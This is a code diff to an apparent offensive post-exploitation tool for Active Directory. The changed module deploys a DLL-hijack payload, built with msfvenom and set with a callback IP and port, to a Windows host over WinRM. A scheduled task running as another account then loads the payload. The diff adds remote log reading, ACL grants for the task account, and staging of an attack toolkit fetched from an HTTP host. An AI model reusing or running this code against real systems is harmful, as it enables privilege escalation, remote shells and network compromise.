@@ -8,12 +8,12 @@ from typing import TYPE_CHECKING, Any
 
 from admapper.models.workspace import OperationMode
 from admapper.postex.creds import WinRMCred, resolve_winrm_cred
-from admapper.postex.payload import PayloadMode, prepare_hijack_payload
+from admapper.postex.monitor_log import resolve_hijack_payload_names, resolve_monitor_log_path
+from admapper.postex.task_run_as import resolve_task_run_as
+from admapper.postex.payload import PayloadGenerator, PayloadMode, prepare_hijack_payload
 from admapper.postex.pe_arch import (
     TargetArch,
-    infer_arch_from_monitor_log,
-    normalize_arch,
-    ps_read_pe_arch_script,
+    resolve_payload_arch,
 )
 from admapper.support.connectivity import (
     TargetUnreachableError,
@@ -40,6 +40,7 @@ class DeployResult:
     callback_ip: str = ""
     callback_port: int = 0
     enroll_deploy_marker: str = ""
+    target_arch: str = "x64"
     errors: list[str] = field(default_factory=list)
 
 
@@ -54,6 +55,14 @@ def _finding_from_scan(scan_data: dict[str, Any]) -> dict[str, Any] | None:
     return findings[0] if findings else None
 
 
+def _find_postex_op(ws_path: Path, op_id: str) -> dict[str, Any] | None:
+    ops = _load_json(ws_path / "postex_ops.json") or {}
+    for item in ops.get("opportunities") or []:
+        if str(item.get("id")) == op_id:
+            return item
+    return None
+
+
 def resolve_hijack_op(
     session: Session,
     *,
@@ -64,18 +73,38 @@ def resolve_hijack_op(
     scan = _load_json(ws_path / "postex_scan.json") or {}
     finding = _finding_from_scan(scan)
 
+    from admapper.postex.analyze import resolve_hijack_op_id
+
     if op_id:
-        ops = _load_json(ws_path / "postex_ops.json") or {}
-        for item in ops.get("opportunities") or []:
-            if str(item.get("id")) == op_id:
-                if item.get("technique") != technique:
-                    print_warning(
-                        f"op {op_id} technique is {item.get('technique')}, not {technique}"
-                    )
-                merged = dict(item)
-                merged["finding"] = finding
-                return merged
-        raise ValueError(f"opportunity not found: {op_id} — run: admapper postex -w <workspace>")
+        item = _find_postex_op(ws_path, op_id)
+        if item is None:
+            raise ValueError(f"opportunity not found: {op_id} — run: admapper postex -w <workspace>")
+        if item.get("technique") != technique:
+            hijack_id = resolve_hijack_op_id(session)
+            if hijack_id and hijack_id != op_id:
+                print_info(
+                    f"op {op_id} is now {item.get('technique')} — postex ids shifted after "
+                    f"re-analysis; using {hijack_id} ({technique})"
+                )
+                op_id = hijack_id
+                item = _find_postex_op(ws_path, op_id)
+            else:
+                print_warning(
+                    f"op {op_id} technique is {item.get('technique')}, not {technique}"
+                )
+        if item is None:
+            raise ValueError(f"hijack opportunity not found — run: admapper postex scan -w <workspace>")
+        merged = dict(item)
+        merged["finding"] = finding
+        return merged
+
+    hijack_id = resolve_hijack_op_id(session)
+    if hijack_id:
+        item = _find_postex_op(ws_path, hijack_id)
+        if item:
+            merged = dict(item)
+            merged["finding"] = finding
+            return merged
 
     if finding:
         return {
@@ -98,50 +127,16 @@ def _resolve_target_arch(
     *,
     client: WinRMClient | None = None,
     arch_override: TargetArch | None = None,
+    ws_path: Path | None = None,
 ) -> TargetArch:
-    if arch_override:
-        return arch_override
-    arch = normalize_arch(str(finding.get("target_arch") or ""))
-    if arch:
-        return arch
-    monitor_text = str(scan.get("monitor_log_excerpt") or "")
-    if client is not None:
-        drop = str(finding.get("drop_path") or r"C:\ProgramData")
-        drop_stripped = drop.rstrip('\\')
-        for rel in (
-            r"\Logs\app.log",
-            r"\Logs\service.log",
-            r"\Logs\error.log",
-            r"\app.log",
-            r"\service.log",
-        ):
-            path = f"{drop_stripped}{rel}"
-            safe = path.replace("'", "''")
-            try:
-                proc = client.execute(
-                    f"if(Test-Path -LiteralPath '{safe}')"
-                    f"{{Get-Content -LiteralPath '{safe}' -Tail 20}}",
-                    shell="powershell",
-                )
-                live = (proc.stdout or "").strip()
-                if live:
-                    monitor_text = live
-                    break
-            except WinRMError:
-                pass
-    arch = infer_arch_from_monitor_log(monitor_text)
-    if arch:
-        return arch
-    exe = str(finding.get("executable") or "").strip().strip('"')
-    if client is not None and exe.lower().endswith(".exe"):
-        try:
-            proc = client.execute(ps_read_pe_arch_script(exe), shell="powershell")
-            arch = normalize_arch((proc.stdout or "").strip())
-            if arch:
-                return arch
-        except WinRMError:
-            pass
-    return "x86"
+    arch, _reason = resolve_payload_arch(
+        finding,
+        scan,
+        client=client,
+        arch_override=arch_override,
+        ws_path=ws_path,
+    )
+    return arch
 
 
 def deploy_dll_hijack(
@@ -160,6 +155,7 @@ def deploy_dll_hijack(
     enroll_dns: str = "",
     enroll_ca_name: str = "",
     enroll_ca_host: str = "",
+    generator: PayloadGenerator = "msfvenom",
 ) -> DeployResult:
     if session.workspace is None:
         raise RuntimeError("no active workspace")
@@ -170,10 +166,9 @@ def deploy_dll_hijack(
     finding = op.get("finding") or _finding_from_scan(scan) or {}
 
     drop_path = str(finding.get("drop_path") or r"C:\ProgramData")
-    zip_name = str(finding.get("payload_zip") or "payload.zip")
-    dll_name = str(finding.get("payload_dll") or "payload.dll")
+    zip_name, dll_name = resolve_hijack_payload_names(finding, scan)
     task_name = str(finding.get("task_name") or "scheduled task")
-    run_as = str(finding.get("run_as_user") or "unknown")
+    run_as = resolve_task_run_as(scan, finding, ws_path=ws_path)
     shell_user = str(scan.get("shell_user") or op.get("context") or "")
     target_host = str(scan.get("dc_ip") or op.get("target_host") or "")
 
@@ -192,15 +187,36 @@ def deploy_dll_hijack(
     remote_path = f"{drop_path.rstrip('\\')}\\{zip_name}"
     remote_path_fwd = remote_path.replace("\\", "/")
     client = _winrm_client(cred, session)
-    target_arch = _resolve_target_arch(finding, scan, client=client, arch_override=arch)
-    print_info(f"payload arch: {target_arch}")
+    target_arch, arch_reason = resolve_payload_arch(
+        finding,
+        scan,
+        client=client,
+        arch_override=arch,
+        ws_path=ws_path,
+    )
+    print_info(f"arch: {target_arch} ({arch_reason})")
+
+    monitor_for_export = str(scan.get("monitor_log_excerpt") or "")
+    log_path = resolve_monitor_log_path(scan, drop_path)
+    if log_path:
+        try:
+            safe_log = log_path.replace("'", "''")
+            proc = client.execute(
+                f"Get-Content -LiteralPath '{safe_log}' -Tail 50",
+                shell="powershell",
+            )
+            live = (proc.stdout or "").strip()
+            if live:
+                monitor_for_export = live
+        except WinRMError:
+            pass
 
     mode = session.mode
     safe_zip = zip_name if session.mode == OperationMode.MANUAL else "payload.zip"
     safe_run_as = run_as if session.mode == OperationMode.MANUAL else "detected"
     msg = (
         f"deploy {safe_zip} → {remote_path} via WinRM as {cred.domain}\\{cred.username} "
-        f"(task {task_name} → {safe_run_as})"
+        f"(task {task_name} → {run_as})"
     )
     if not confirm(
         msg,
@@ -248,6 +264,8 @@ def deploy_dll_hijack(
         enroll_ca_host=enroll_ca_host,
         enroll_run_as_user=run_as,
         enroll_profile=enroll_profile,
+        generator=generator,
+        monitor_log=monitor_for_export,
     )
 
     print_info(f"local payload: {build.zip_path} ({build.generator})")
@@ -263,6 +281,7 @@ def deploy_dll_hijack(
             shell_user=cred.username,
             run_as_user=run_as,
             task_name=task_name,
+            target_arch=target_arch,
         )
 
     enroll_marker = ""
@@ -316,7 +335,35 @@ def deploy_dll_hijack(
                 f"upload {build.zip_path.resolve()} {remote_path}"
             )
         print_success(f"uploaded → {remote_path}")
+        from admapper.postex.monitor_log import grant_task_read_acl
+        from admapper.sharphound.toolkit import REMOTE_TOOLKIT_BASE, stage_toolkit_winrm
+
+        grant_task_read_acl(
+            client,
+            remote_path_fwd,
+            domain=cred.domain,
+            run_as_user=run_as,
+        )
+        toolkit_files: list[str] = []
+        if payload_mode == "shell" and fetch_host:
+            try:
+                toolkit_files = stage_toolkit_winrm(
+                    client,
+                    domain=cred.domain,
+                    upload_user=cred.username,
+                    execute_as=run_as,
+                    http_fetch_host=fetch_host,
+                )
+            except Exception as exc:  # noqa: BLE001
+                print_warning(f"toolkit staging failed (collect may re-stage): {exc}")
     except WinRMError as exc:
+        from admapper.postex.monitor_log import print_postex_diagnostics
+
+        print_warning("upload failed — fetching remote log and payload status …")
+        try:
+            print_postex_diagnostics(session, host=target_host or None, cred_id=cred_id)
+        except Exception as diag_exc:
+            print_warning(f"diagnostics: {diag_exc}")
         raise RuntimeError(str(exc)) from exc
 
     log = {
@@ -331,6 +378,10 @@ def deploy_dll_hijack(
         "run_as_user": run_as,
         "task_name": task_name,
         "enroll_deploy_marker": enroll_marker,
+        "toolkit_base": (REMOTE_TOOLKIT_BASE if toolkit_files else ""),
+        "toolkit_upload_user": (cred.username if toolkit_files else ""),
+        "toolkit_execute_as": (run_as if toolkit_files else ""),
+        "toolkit_files": toolkit_files,
     }
     (ws_path / "postex_deploy.json").write_text(
         json.dumps(log, indent=2, sort_keys=True) + "\n",
@@ -347,4 +398,5 @@ def deploy_dll_hijack(
         callback_ip=build.lhost or lhost or "",
         callback_port=build.lport or lport,
         enroll_deploy_marker=enroll_marker,
+        target_arch=target_arch,
     )
